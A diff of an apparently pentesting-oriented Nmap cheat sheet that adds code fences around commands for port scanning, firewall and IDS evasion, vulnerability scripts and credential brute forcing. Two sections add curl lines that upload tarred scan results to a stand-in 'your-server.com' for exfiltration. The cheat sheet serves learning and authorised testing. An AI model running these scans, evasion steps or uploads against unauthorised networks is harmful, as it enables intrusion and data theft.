@@ -51,36 +51,48 @@ Nmap commands from beginner level to advanced level that are categorized in the 
    ## 1. THE FUNDAMENTALS
  
   - Quick port scan with version detection
+```bash
 nmap -sV -T4 192.168.1.1
-
+```
 - Full port scan (slow but thorough)
+```bash
 nmap -p- -sV -T4 192.168.1.1
-
+```
 - Aggressive scan (OS, version, scripts, traceroute)
+```bash
 nmap -A -T4 192.168.1.1
-
+```
 - UDP scan (find DNS, SNMP, other non‑TCP services)
+```bash
  nmap -sU 192.168.1.1
-
+```
 - Save everything (normal, XML, grepable)
+```bash
 nmap -oA scan_name -A -T4 192.168.1.0/24 
-   
+```   
+
 [🔝 Back to Top](#📖-table-of-contents)
 
 
    ## 2. NETWORK DISCOVERY 
 
 - Ping sweep - find live hosts
+```bash
 nmap -sn 192.168.1.0/24
-
+```
 - ARP ping (works even when ICMP is blocked, needs root)
+```bash
 nmap -sn -PR 192.168.1.0/24
-
+```
 - TCP SYN ping (bypasses firewall rules)
+```bash
 nmap -sn -PS 443,80 192.168.1.0/24
-
+```
 - Fast host discovery with traceroute
+```bash
 nmap -sn --traceroute 192.168.1.0/24
+```
+
 
 [🔝 Back to Top](#📖-table-of-contents)
 
@@ -88,22 +100,29 @@ nmap -sn --traceroute 192.168.1.0/24
   ##  3. STEALTH AND EVASION
         
 - Sneaky scan (slow, hard to detect)
+```bash
 nmap -T1 -sS 192.168.1.1
-
+```
 - Decoy scan (hide your IP among 10 random hosts)
+```bash
 nmap -D RND:10 -sS 192.168.1.1
-
+```
 - Fragment packets (evade simple firewalls)
+```bash
 nmap -f -sS 192.168.1.1
-
+```
 - MAC spoofing (needs root)
+```bash
 nmap --spoof-mac 0 192.168.1.1
-
+```
 - Source port manipulation (pretend to be DNS)
+```bash
 nmap --source-port 53 -sS 192.168.1.1
-
+```
 - Idle scan (use a zombie host, advanced)
+```bash
 nmap -sI zombie_ip 192.168.1.1
+```
 
 [🔝 Back to Top](#📖-table-of-contents)
 
@@ -111,22 +130,29 @@ nmap -sI zombie_ip 192.168.1.1
    ## 4. ADVANCED SCANNING TECHNIQUE
 
 - TCP Null scan (evade non-stateful firewalls)
+```bash
 nmap -sN 192.168.1.1
-
+```
 - TCP FIN scan
+```bash
 nmap -sF 192.168.1.1
-
+```
 - TCP Maimon scan
+```bash
 nmap -sM 192.168.1.1
-
+```
 - ACK scan (map firewall rules)
+```bash
 nmap -sA 192.168.1.1
-
+```
 - Window scan (same as ACK but better)
+```bash
 nmap -sW 192.168.1.1
-
+```
 - Custom packet scan 
+```bash
 nmap --scanflags SYN,URG 192.168.1.1
+```
 
 [🔝 Back to Top](#📖-table-of-contents)
 
@@ -134,25 +160,33 @@ nmap --scanflags SYN,URG 192.168.1.1
    ## 5. SERVICE AND VULNERABILITY DISCOVERY 
 
 - Version detection with intensity (0-9, higher is slower but deeper)
+```bash
 nmap -sV --version-intensity 9 192.168.1.1
-
+```
 - Service scan with default scripts
+```bash
 nmap -sC -T4 192.168.1.1
-
+```
 - Vulnerability scan (noisy, but effective)
+```bash
 nmap --script vuln -T4 192.168.1.1
-
+```
 - Specific vulnerability scripts
+```bash
 nmap --script http-vuln-*,smb-vuln-* -T4 192.168.1.1
-
+```
 - Brute force default credentials (dangerous) 
+```bash
 nmap --script brute 192.168.1.1
-
+```
 - SMTP open relay check
+```bash
 nmap --script smtp-open-relay -p 25 192.168.1.1
-
+```
 - DNS enumeration
+```bash
 nmap --script dns-recursion,dns-zone-transfer -p 53 192.168.1.0/24
+```
 
 [🔝 Back to Top](#📖-table-of-contents)
 
@@ -160,20 +194,26 @@ nmap --script dns-recursion,dns-zone-transfer -p 53 192.168.1.0/24
    ## 6. OUTPUT AND EXFILTRATION 
 
 - Save all formats
+```bash
 nmap -oA scan_name 192.168.1.0/24
-
+```
 - Grepable output for scripting
+```bash
 nmap -oG scan.grep 192.168.1.0/24
-
+```
 - Extract IPs from scan
+```bash
 grep "Nmap scan report" scan.txt | awk '{print $5}' > live_hosts.txt
-
+```
 - Extract open ports
+```bash
 grep "open" scan.txt | awk '{print $1, $3}' > open_ports.txt
-
+```
 - For exfiltration: compress and send to your server
+```bash
 tar -czf scan_results.tar.gz scan.txt scan.xml scan.grep
 curl -F "file=@scan_results.tar.gz" http://your-server.com/upload
+```
 
 [🔝 Back to Top](#📖-table-of-contents)
 
@@ -181,25 +221,33 @@ curl -F "file=@scan_results.tar.gz" http://your-server.com/upload
   ##  7. TIMING AND PERFORMANCE 
 
 - Paranoid (0.1s delay, avoid IDS)
+```bash
 nmap -T0 -sS 192.168.1.1
-
+```
 - Sneaky (15s delay, still evasive)
+```bash
 nmap -T1 -sS 192.168.1.1
-
+```
 - Polite (0.4s delay, normal)
+```bash
 nmap -T2 -sS 192.168.1.1
-
+```
 - Normal (default)
+```bash
 nmap -T3 -sS 192.168.1.1
-
+```
 - Aggressive (fast, might drop packets)
+```bash
 nmap -T4 -sS 192.168.1.1
-
+```
 - Insane (very fast, likely to trigger alerts)
+```bash
 nmap -T5 -sS 192.168.1.1
-
+```
 - Max rate (overkill, for when you don't care about stealth)
+```bash
 nmap --min-rate 10000 -p- 192.168.1.1
+```
 
 [🔝 Back to Top](#📖-table-of-contents)
 
@@ -207,22 +255,28 @@ nmap --min-rate 10000 -p- 192.168.1.1
   ##  8. EXFILTRATION AND POST-PROCESSING 
 
 - Step 1: Host discovery (fast)
+```bash
 nmap -sn 192.168.1.0/24 -oG live_hosts.grep
-
+```
 - Step 2: Extract IPs to file
+```bash
 grep "Up" live_hosts.grep | cut -d' ' -f2 > ip_list.txt
-
+```
 - Step 3: Deep scan each host
-  while read ip; do
+```bash
+   while read ip; do
       nmap -sV -A -T4 "$ip" -oN "scan_${ip}.txt"
   done < ip_list.txt
-
+```
 - Step 4: Extract interesting data
+```bash
 grep -E "open|VERSION|OS" scan_*.txt > interesting_results.txt
-
+```
 - Step 5: Exfiltrate to your server 
+```bash
 tar -czf batch_scan.tar.gz scan_*.txt interesting_results.txt
 curl -X POST -F "data=@batch_scan.tar.gz" http://your-server.com/exfil
+```
 
 [🔝 Back to Top](#📖-table-of-contents)
 
@@ -230,6 +284,7 @@ curl -X POST -F "data=@batch_scan.tar.gz" http://your-server.com/exfil
    ## 9. TARGET-SPECIFIC COMMANDS 
 
 - Web server enumeration
+```bash
 nmap --script http-enum,http-headers,http-title -p 80,443,8080 192.168.1.1
 
 - SMB enumeration (Windows networks)
